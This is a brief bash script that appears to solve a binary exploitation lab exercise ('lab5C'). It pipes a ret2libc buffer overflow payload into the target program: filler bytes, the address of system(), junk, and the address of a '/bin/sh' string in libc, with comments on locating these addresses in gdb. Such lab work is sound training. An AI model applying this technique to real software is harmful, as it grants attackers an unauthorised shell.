#!/bin/bash

# First DWORD after 156 of filling bytes is an address of 'system', then 
# comes JUNK for return address from that system, then as a parameter - 
# globally accessible "/bin/sh" string found within libc using gdb's peda
# 	find "/bin/sh" which yielded to me 0xb7f83a24
(python -c 'print "A"*156 + "\x90\x31\xe6\xb7XXXX\x24\x3a\xf8\xb7"' ; cat) | ./lab5C
